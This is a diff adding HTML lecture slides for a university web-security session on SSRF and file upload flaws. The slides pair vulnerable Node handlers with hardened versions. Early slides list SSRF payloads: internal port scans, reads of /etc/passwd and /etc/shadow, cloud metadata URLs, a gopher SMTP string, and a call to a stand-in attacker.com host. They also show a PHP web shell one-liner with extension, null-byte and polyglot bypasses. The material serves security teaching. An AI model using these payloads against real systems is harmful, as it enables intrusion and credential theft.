@@ -1,0 +1,654 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CMU540 - Session 9: WEB-SSRF-01 & WEB-UPLOAD-01 - SSRF & File Upload Security</title>
+
+    <link rel="stylesheet" href="/libs/reveal.js/dist/reset.css">
+    <link rel="stylesheet" href="/libs/reveal.js/dist/reveal.css">
+    <link rel="stylesheet" href="/theme.css">
+
+    <!-- Syntax highlighting -->
+    <link rel="stylesheet" href="/libs/reveal.js/plugin/highlight/monokai.css">
+    <link rel="stylesheet" href="/chrome.css">
+</head>
+
+<body>
+<header class="jw-bar">
+  <a class="jw-brand" href="https://jameswil.com/">
+    <span class="jw-mark">JW</span>
+    <span class="jw-brand-name">J Williams</span>
+  </a>
+  <div class="jw-context">
+    <a class="jw-course" href="../">CMU540</a>
+    <span class="jw-sep">/</span>
+    <span class="jw-session">WEB-SSRF-01 &amp; WEB-UPLOAD-01 - SSRF &amp; File Upload Security</span>
+    <span class="jw-count">9 of 12</span>
+  </div>
+  <nav class="jw-nav" aria-label="Session">
+    <a class="jw-nav-btn" href="../session8/" rel="prev" aria-label="Prev session"><span>←</span>Prev<span></span></a>
+    <a class="jw-nav-btn" href="../session10/" rel="next" aria-label="Next session"><span></span>Next<span>→</span></a>
+  </nav>
+</header>
+
+        
+    <div class="reveal">
+        <div class="slides">
+
+            <!-- Title Slide -->
+            <section class="title-slide" data-slide-title="Title Slide">
+                <div class="module-code">CMU540</div>
+                <h1>WEB-SSRF-01 & WEB-UPLOAD-01 - SSRF & File Upload Security</h1>
+                <h2>Session 9</h2>
+                <div class="author">
+                    <p><strong>James Williams</strong></p>
+                    <p><a href="mailto:jwilliams@staff.newman.ac.uk">jwilliams@staff.newman.ac.uk</a></p>
+                </div>
+            </section>
+
+            <section data-slide-title="Learning Objectives">
+                <h2>Learning Objectives</h2>
+                <ul>
+                    <li>Understand OWASP A10: SSRF and File Upload Security</li>
+                    <li>Identify SSRF attack vectors and prevention methods</li>
+                    <li>Learn secure file upload practices</li>
+                    <li>Practice vulnerability discovery using OS&sup3; Studio</li>
+                    <li>Implement secure SSRF protection and file handling</li>
+                    <li>Explore career opportunities in web security</li>
+                </ul>
+            </section>
+
+            <section data-slide-title="OWASP A10: SSRF & File Upload Security">
+                <h2>OWASP A10: SSRF & File Upload Security</h2>
+                <div class="highlight">
+                    <p><strong>SSRF:</strong> Server-Side Request Forgery forces the server to make requests to unintended locations</p>
+                    <p><strong>File Upload:</strong> Insecure file upload can lead to remote code execution and data breaches</p>
+                </div>
+                <h3>Key Areas:</h3>
+                <ul>
+                    <li>SSRF attack techniques</li>
+                    <li>File upload vulnerabilities</li>
+                    <li>Input validation and sanitization</li>
+                    <li>Secure file handling</li>
+                </ul>
+            </section>
+
+            <section data-slide-title="Real-World Impact">
+                <h2>Real-World Impact</h2>
+                <div class="vulnerability">
+                    <h3>Notable Breaches:</h3>
+                    <ul>
+                        <li><strong>Capital One (2019):</strong> SSRF led to 100M records exposed</li>
+                        <li><strong>GitHub (2019):</strong> SSRF vulnerability in webhooks</li>
+                        <li><strong>Facebook (2013):</strong> File upload vulnerability exposed user data</li>
+                    </ul>
+                    <p><strong>Impact:</strong> Data breaches, server compromise, financial loss</p>
+                </div>
+            </section>
+
+            <section data-slide-title="SSRF Attack Techniques">
+                <h2>SSRF Attack Techniques</h2>
+                <h3>1. Basic SSRF</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- VULNERABLE: SSRF --&gt;
+app.get('/fetch', (req, res) =&gt; {
+  const url = req.query.url;
+  fetch(url).then(response =&gt; {
+    res.json(response);
+  });
+});
+&lt;!-- Attack --&gt;
+GET /fetch?url=http://localhost:22
+GET /fetch?url=file:///etc/passwd
+GET /fetch?url=http://169.254.169.254/latest/meta-data/</code></pre>
+                </div>
+                <h3>2. Blind SSRF</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- VULNERABLE: Blind SSRF --&gt;
+app.post('/webhook', (req, res) =&gt; {
+  const url = req.body.url;
+  fetch(url); // No response returned
+  res.json({ status: 'sent' });
+});
+&lt;!-- Attack with external monitoring --&gt;
+POST /webhook
+{"url": "http://attacker.com/ssrf"}</code></pre>
+                </div>
+            </section>
+
+            <section data-slide-title="SSRF Attack Vectors">
+                <h2>SSRF Attack Vectors</h2>
+                <h3>1. Internal Network Scanning</h3>
+                <div class="code-example">
+                    <pre><code class="language-plaintext">&lt;!-- Internal network scanning --&gt;
+http://localhost:22      # SSH
+http://localhost:3306     # MySQL
+http://localhost:5432     # PostgreSQL
+http://localhost:6379     # Redis
+http://localhost:9200     # Elasticsearch
+&lt;!-- Cloud metadata endpoints --&gt;
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/</code></pre>
+                </div>
+                <h3>2. Protocol Smuggling</h3>
+                <div class="code-example">
+                    <pre><code class="language-plaintext">&lt;!-- Protocol smuggling --&gt;
+gopher://localhost:25/_HELO%20attacker.com%0AMAIL%20FROM:%20test@attacker.com%0ARCPT%20TO:%20victim@target.com%0ADATA%0ASubject:%20SSRF%20Test%0A%0AThis%20is%20a%20test%0A.%0AQUIT%0A
+&lt;!-- File access --&gt;
+file:///etc/passwd
+file:///etc/shadow
+file:///proc/self/environ</code></pre>
+                </div>
+            </section>
+
+            <section data-slide-title="File Upload Vulnerabilities">
+                <h2>File Upload Vulnerabilities</h2>
+                <h3>1. Unrestricted File Upload</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- VULNERABLE: Unrestricted upload --&gt;
+app.post('/upload', upload.single('file'), (req, res) =&gt; {
+  const file = req.file;
+  res.json({
+    filename: file.filename,
+    path: file.path
+  });
+});
+&lt;!-- Malicious file --&gt;
+&lt;?php system($_GET['cmd']); ?&gt;  // shell.php</code></pre>
+                </div>
+                <h3>2. File Type Bypass</h3>
+                <div class="code-example">
+                    <pre><code class="language-php">&lt;!-- VULNERABLE: MIME type check only --&gt;
+if (file.mimetype === 'image/jpeg') {
+  allowUpload(file);
+}
+&lt;!-- Bypass --&gt;
+Content-Type: image/jpeg
+&lt;?php system($_GET['cmd']); ?&gt;  // shell.php</code></pre>
+                </div>
+            </section>
+
+            <section data-slide-title="File Upload Attack Techniques">
+                <h2>File Upload Attack Techniques</h2>
+                <h3>1. Double Extension</h3>
+                <div class="code-example">
+                    <pre><code class="language-php">&lt;!-- Double extension attack --&gt;
+shell.php.jpg
+shell.php.png
+shell.php.gif
+&lt;!-- Server processes as PHP --&gt;
+&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+                </div>
+                <h3>2. Null Byte Injection</h3>
+                <div class="code-example">
+                    <pre><code class="language-plaintext">&lt;!-- Null byte injection --&gt;
+shell.php%00.jpg
+shell.php\x00.jpg
+&lt;!-- Server truncates at null byte --&gt;
+filename: shell.php</code></pre>
+                </div>
+                <h3>3. Polyglot Files</h3>
+                <div class="code-example">
+                    <pre><code class="language-php">&lt;!-- Polyglot file --&gt;
+GIF89a&lt;?php system($_GET['cmd']); ?&gt;
+&lt;!-- Valid GIF header + PHP code --&gt;</code></pre>
+                </div>
+            </section>
+
+            <section data-slide-title="Career Opportunities in Web Security">
+                <h2>Career Opportunities in Web Security</h2>
+                <div class="career-box">
+                    <h3>Web Security Roles:</h3>
+                    <ul>
+                        <li><strong>Web Application Security Engineer:</strong> £45,000 - £90,000</li>
+                        <li><strong>Penetration Tester:</strong> £35,000 - £70,000</li>
+                        <li><strong>Security Consultant:</strong> £50,000 - £100,000</li>
+                        <li><strong>Bug Bounty Hunter:</strong> £30,000 - £150,000+</li>
+                        <li><strong>Security Researcher:</strong> £40,000 - £80,000</li>
+                    </ul>
+                    <p><strong>Skills Needed:</strong> Web security, Penetration testing, Vulnerability assessment</p>
+                </div>
+            </section>
+
+            <section data-slide-title="OS&sup3; Newman Cyber Security Lab">
+                <h2>OS&sup3; Newman Cyber Security Lab</h2>
+                <div class="os3-studio">
+                    <h3>WEB-SSRF-01 & WEB-UPLOAD-01 Lab Environment</h3>
+                    <p>Our OS&sup3; Studio provides hands-on experience with:</p>
+                    <ul>
+                        <li>Applications vulnerable to SSRF attacks</li>
+                        <li>Insecure file upload implementations</li>
+                        <li>Secure implementation challenges</li>
+                        <li>File handling best practices</li>
+                    </ul>
+                    <p><strong>Access:</strong> Available through university portal</p>
+                </div>
+            </section>
+
+            <section data-slide-title="Web Demos and Tools">
+                <h2>Web Demos and Tools</h2>
+                <div class="demo-link">
+                    <h3>Security Testing Tools:</h3>
+                    <ul>
+                        <li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a> - Web application security testing</li>
+                        <li><a href="https://github.com/OWASP/OWASP-ZAP" target="_blank">OWASP ZAP</a> - Open source web app scanner</li>
+                        <li><a href="https://github.com/swisskyrepo/SSRFmap" target="_blank">SSRFmap</a> - SSRF exploitation tool</li>
+                        <li><a href="https://github.com/OWASP/WebGoat" target="_blank">WebGoat</a> - Vulnerable web application</li>
+                        <li><a href="https://pentesterlab.com/" target="_blank">PentesterLab</a> - Hands-on security training</li>
+                    </ul>
+                </div>
+            </section>
+
+            <section data-slide-title="Case Study: Capital One SSRF">
+                <h2>Case Study: Capital One SSRF</h2>
+                <div class="vulnerability">
+                    <h3>2019 Capital One SSRF Breach</h3>
+                    <ul>
+                        <li><strong>Impact:</strong> 100 million records exposed</li>
+                        <li><strong>Cause:</strong> SSRF vulnerability in AWS metadata service</li>
+                        <li><strong>Method:</strong> Attacker used SSRF to obtain AWS credentials</li>
+                        <li><strong>Cost:</strong> $190 million in settlements</li>
+                    </ul>
+                    <p><strong>Lesson:</strong> SSRF can lead to cloud infrastructure compromise</p>
+                </div>
+            </section>
+
+            <section data-slide-title="Summary: Common SSRF & File Upload Issues">
+                <h2>Summary: Common SSRF & File Upload Issues</h2>
+                <div class="highlight">
+                    <h3>Key Vulnerabilities to Look For:</h3>
+                    <ol>
+                        <li>Unvalidated URL parameters</li>
+                        <li>Missing input validation</li>
+                        <li>Unrestricted file uploads</li>
+                        <li>Insufficient file type checking</li>
+                        <li>Missing file content validation</li>
+                        <li>Insecure file storage</li>
+                        <li>Missing access controls</li>
+                    </ol>
+                </div>
+            </section>
+
+            <section data-slide-title="Task 1: SSRF & File Upload Vulnerability Discovery">
+                <h2>Task 1: SSRF & File Upload Vulnerability Discovery</h2>
+                <div class="task-box">
+                    <h3>Objective:</h3>
+                    <p>Use OS&sup3; Studio to identify SSRF vulnerabilities and insecure file upload implementations.</p>
+                    
+                    <h3>Instructions:</h3>
+                    <ol>
+                        <li>Access the OS&sup3; Studio vulnerable application</li>
+                        <li>Test for SSRF vulnerabilities in URL parameters</li>
+                        <li>Attempt internal network scanning</li>
+                        <li>Test for cloud metadata access</li>
+                        <li>Look for unrestricted file uploads</li>
+                        <li>Test file type bypass techniques</li>
+                        <li>Document all findings with proof of concept</li>
+                        <li>Prepare a vulnerability assessment report</li>
+                    </ol>
+                    <p><strong>Time:</strong> 45 minutes</p>
+                    <p><em>Focus on systematic testing and thorough documentation</em></p>
+                </div>
+            </section>
+
+            <section class="center" data-slide-title="Break Time">
+                <h2>Break Time</h2>
+                <div class="highlight">
+                    <h3>15 Minutes</h3>
+                    <p>Take a break, ask questions, or catch up on the previous task.</p>
+                    <p><em>Next: Secure implementation and Task 2</em></p>
+                </div>
+            </section>
+
+            <section data-slide-title="Secure SSRF Protection">
+                <h2>Secure SSRF Protection</h2>
+                
+                <h3>1. URL Validation</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- SECURE: URL validation --&gt;
+function validateUrl(url) {
+  try {
+    const parsedUrl = new URL(url);
+    // Block private IPs
+    if (isPrivateIP(parsedUrl.hostname)) {
+      return false;
+    }
+    // Allow only HTTP/HTTPS
+    if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
+      return false;
+    }
+    return true;
+  } catch {
+    return false;
+  }
+}
+function isPrivateIP(hostname) {
+  const privateRanges = [
+    /^10\./, /^172\.(1[6-9]|2[0-9]|3[0-1])\./, /^192\.168\./,
+    /^127\./, /^169\.254\./, /^::1$/, /^fc00:/, /^fe80:/
+  ];
+  return privateRanges.some(range =&gt; range.test(hostname));
+}</code></pre>
+                </div>
+
+                <h3>2. Allowlist Approach</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- SECURE: Allowlist approach --&gt;
+const allowedDomains = [
+  'api.example.com',
+  'trusted-service.com'
+];
+function isAllowedDomain(hostname) {
+  return allowedDomains.includes(hostname);
+}
+app.get('/fetch', (req, res) =&gt; {
+  const url = req.query.url;
+  if (!validateUrl(url) || !isAllowedDomain(new URL(url).hostname)) {
+    return res.status(400).json({ error: 'Invalid URL' });
+  }
+  fetch(url).then(response =&gt; res.json(response));
+});</code></pre>
+                </div>
+            </section>
+
+            <section data-slide-title="Secure File Upload Implementation">
+                <h2>Secure File Upload Implementation</h2>
+                
+                <h3>1. File Type Validation</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- SECURE: File type validation --&gt;
+const multer = require('multer');
+const path = require('path');
+const storage = multer.diskStorage({
+  destination: 'uploads/',
+  filename: (req, file, cb) =&gt; {
+    const ext = path.extname(file.originalname);
+    const name = crypto.randomBytes(16).toString('hex');
+    cb(null, name + ext);
+  }
+});
+const upload = multer({
+  storage: storage,
+  fileFilter: (req, file, cb) =&gt; {
+    const allowedTypes = ['.jpg', '.jpeg', '.png', '.gif'];
+    const ext = path.extname(file.originalname).toLowerCase();
+    if (allowedTypes.includes(ext)) {
+      cb(null, true);
+    } else {
+      cb(new Error('Invalid file type'), false);
+    }
+  },
+  limits: { fileSize: 5 * 1024 * 1024 } // 5MB
+});</code></pre>
+                </div>
+
+                <h3>2. File Content Validation</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- SECURE: File content validation --&gt;
+const fileType = require('file-type');
+async function validateFileContent(filePath) {
+  const type = await fileType.fromFile(filePath);
+  const allowedMimes = [
+    'image/jpeg', 'image/png', 'image/gif'
+  ];
+  return allowedMimes.includes(type.mime);
+}
+app.post('/upload', upload.single('file'), async (req, res) =&gt; {
+  if (!await validateFileContent(req.file.path)) {
+    fs.unlinkSync(req.file.path);
+    return res.status(400).json({ error: 'Invalid file content' });
+  }
+  res.json({ success: true, filename: req.file.filename });
+});</code></pre>
+                </div>
+            </section>
+
+            <section data-slide-title="File Storage Security">
+                <h2>File Storage Security</h2>
+                
+                <h3>1. Secure File Storage</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- SECURE: File storage outside web root --&gt;
+const path = require('path');
+const storage = multer.diskStorage({
+  destination: path.join(__dirname, '../uploads/'), // Outside web root
+  filename: (req, file, cb) =&gt; {
+    const ext = path.extname(file.originalname);
+    const name = crypto.randomBytes(32).toString('hex');
+    cb(null, name + ext);
+  }
+});
+// Serve files through secure endpoint
+app.get('/files/:filename', (req, res) =&gt; {
+  const filename = req.params.filename;
+  if (!isValidFilename(filename)) {
+    return res.status(400).json({ error: 'Invalid filename' });
+  }
+  res.sendFile(path.join(__dirname, '../uploads/', filename));
+});</code></pre>
+                </div>
+
+                <h3>2. File Access Controls</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- SECURE: File access controls --&gt;
+app.get('/files/:filename', authenticateUser, (req, res) =&gt; {
+  const filename = req.params.filename;
+  const filePath = path.join(__dirname, '../uploads/', filename);
+  // Check if user has access to this file
+  if (!hasFileAccess(req.user.id, filename)) {
+    return res.status(403).json({ error: 'Access denied' });
+  }
+  // Log file access
+  logFileAccess(req.user.id, filename, req.ip);
+  res.sendFile(filePath);
+});</code></pre>
+                </div>
+            </section>
+
+            <section data-slide-title="Input Sanitization">
+                <h2>Input Sanitization</h2>
+                
+                <h3>1. Filename Sanitization</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- SECURE: Filename sanitization --&gt;
+function sanitizeFilename(filename) {
+  // Remove path traversal attempts
+  filename = filename.replace(/[\/\\]/g, '');
+  // Remove null bytes
+  filename = filename.replace(/\0/g, '');
+  // Remove special characters
+  filename = filename.replace(/[^a-zA-Z0-9.-]/g, '');
+  // Limit length
+  filename = filename.substring(0, 255);
+  return filename;
+}
+const upload = multer({
+  storage: multer.diskStorage({
+    filename: (req, file, cb) =&gt; {
+      const sanitized = sanitizeFilename(file.originalname);
+      const ext = path.extname(sanitized);
+      const name = crypto.randomBytes(16).toString('hex');
+      cb(null, name + ext);
+    }
+  })
+});</code></pre>
+                </div>
+
+                <h3>2. URL Sanitization</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- SECURE: URL sanitization --&gt;
+function sanitizeUrl(url) {
+  // Remove dangerous protocols
+  url = url.replace(/^(file|gopher|ftp|ldap):/i, '');
+  // Remove null bytes
+  url = url.replace(/\0/g, '');
+  // Remove control characters
+  url = url.replace(/[\x00-\x1F\x7F]/g, '');
+  return url;
+}
+app.get('/fetch', (req, res) =&gt; {
+  let url = req.query.url;
+  url = sanitizeUrl(url);
+  if (!validateUrl(url)) {
+    return res.status(400).json({ error: 'Invalid URL' });
+  }
+  fetch(url).then(response =&gt; res.json(response));
+});</code></pre>
+                </div>
+            </section>
+
+            <section data-slide-title="Monitoring and Logging">
+                <h2>Monitoring and Logging</h2>
+                
+                <h3>1. Security Event Logging</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- SECURE: Security logging --&gt;
+function logSecurityEvent(event, details) {
+  const logEntry = {
+    timestamp: new Date().toISOString(),
+    event: event,
+    userId: details.userId,
+    ip: details.ip,
+    userAgent: details.userAgent,
+    details: details
+  };
+  securityLogger.warn(logEntry);
+}
+// Log SSRF attempts
+app.get('/fetch', (req, res) =&gt; {
+  const url = req.query.url;
+  if (!validateUrl(url)) {
+    logSecurityEvent('ssrf_attempt', {
+      url: url,
+      ip: req.ip,
+      userAgent: req.headers['user-agent']
+    });
+    return res.status(400).json({ error: 'Invalid URL' });
+  }
+});</code></pre>
+                </div>
+
+                <h3>2. File Upload Monitoring</h3>
+                <div class="code-example">
+                    <pre><code class="language-javascript">&lt;!-- SECURE: File upload monitoring --&gt;
+app.post('/upload', upload.single('file'), (req, res) =&gt; {
+  logSecurityEvent('file_upload', {
+    filename: req.file.originalname,
+    size: req.file.size,
+    mimetype: req.file.mimetype,
+    ip: req.ip,
+    userId: req.user.id
+  });
+  res.json({ success: true });
+});</code></pre>
+                </div>
+            </section>
+
+            <section data-slide-title="Career Development in Web Security">
+                <h2>Career Development in Web Security</h2>
+                <div class="career-box">
+                    <h3>Next Steps:</h3>
+                    <ul>
+                        <li><strong>Advanced Certifications:</strong> OSWE, GWAPT, OSCP</li>
+                        <li><strong>Specialized Training:</strong> Web application security, Penetration testing</li>
+                        <li><strong>Hands-on Practice:</strong> Bug bounties, CTF competitions</li>
+                        <li><strong>Industry Networking:</strong> Security conferences, meetups</li>
+                        <li><strong>Research:</strong> New attack techniques, Defense methods</li>
+                    </ul>
+                    <p><strong>Resources:</strong> <a href="https://owasp.org/" target="_blank">OWASP</a> | <a href="https://portswigger.net/" target="_blank">PortSwigger</a> | <a href="https://pentesterlab.com/" target="_blank">PentesterLab</a></p>
+                </div>
+            </section>
+
+            <section data-slide-title="Task 2: Secure SSRF Protection & File Upload Implementation">
+                <h2>Task 2: Secure SSRF Protection & File Upload Implementation</h2>
+                <div class="task-box">
+                    <h3>Objective:</h3>
+                    <p>Use OS&sup3; Studio to implement secure SSRF protection and file upload practices.</p>
+                    
+                    <h3>Instructions:</h3>
+                    <ol>
+                        <li>Access the OS&sup3; Studio secure implementation environment</li>
+                        <li>Implement URL validation and allowlisting</li>
+                        <li>Add file type and content validation</li>
+                        <li>Configure secure file storage outside web root</li>
+                        <li>Implement file access controls</li>
+                        <li>Add input sanitization and monitoring</li>
+                        <li>Test the secure implementation</li>
+                        <li>Document the security improvements</li>
+                    </ol>
+                    <p><strong>Time:</strong> 45 minutes</p>
+                    <p><em>Focus on implementing industry-standard security practices</em></p>
+                </div>
+            </section>
+
+            <section data-slide-title="Further Activity: Code Inspection">
+                <h2>Further Activity: Code Inspection</h2>
+                <div class="os3-studio">
+                    <h3>Advanced Students - Code Analysis:</h3>
+                    <p>For students with additional time, explore the source code to understand:</p>
+                    <ul>
+                        <li>How SSRF protection is implemented</li>
+                        <li>File upload validation mechanisms</li>
+                        <li>Input sanitization and validation</li>
+                        <li>File storage and access controls</li>
+                        <li>Security monitoring and logging</li>
+                    </ul>
+                    <p><strong>Deliverable:</strong> Code review report with security recommendations</p>
+                </div>
+            </section>
+
+            <section data-slide-title="Session Summary">
+                <h2>Session Summary</h2>
+                <div class="highlight">
+                    <h3>Key Takeaways:</h3>
+                    <ul>
+                        <li>SSRF can lead to internal network compromise</li>
+                        <li>File upload vulnerabilities can result in RCE</li>
+                        <li>Input validation and sanitization are critical</li>
+                        <li>OS&sup3; Studio provides hands-on vulnerability testing</li>
+                        <li>Secure implementation requires multiple layers of protection</li>
+                        <li>Career opportunities in web security are growing</li>
+                    </ul>
+                </div>
+            </section>
+
+            <section class="center" data-slide-title="Course Completion">
+                <h2>Course Completion</h2>
+                
+            </section>
+
+        </div>
+    </div>
+
+    <script src="/libs/reveal.js/dist/reveal.js"></script>
+    <script src="/libs/reveal.js/plugin/notes/notes.js"></script>
+    <script src="/libs/reveal.js/plugin/markdown/markdown.js"></script>
+    <script src="/libs/reveal.js/plugin/highlight/highlight.js"></script>
+
+    <script>
+        
+        // Prevent wheel events from changing slides when scrolling within scrollable content
+        document.addEventListener('DOMContentLoaded', function() {
+            const scrollableElements = document.querySelectorAll('.reveal pre, .reveal .code-example, .reveal .task-box, .reveal .info-box, .reveal .warning-box, [style*="overflow"]');
+            
+            scrollableElements.forEach(function(element) {
+                element.addEventListener('wheel', function(e) {
+                    e.stopPropagation();
+                }, { passive: true });
+            });
+        });
+        Reveal.initialize({
+            hash: true,
+            slideNumber: true,
+            transition: 'none',
+            backgroundTransition: 'none',
+            center: false,
+            disableLayout: true,
+            plugins: [RevealMarkdown, RevealHighlight, RevealNotes]
+        });
+    </script><script src="/chrome.js"></script>
+</body>
+
+</html>
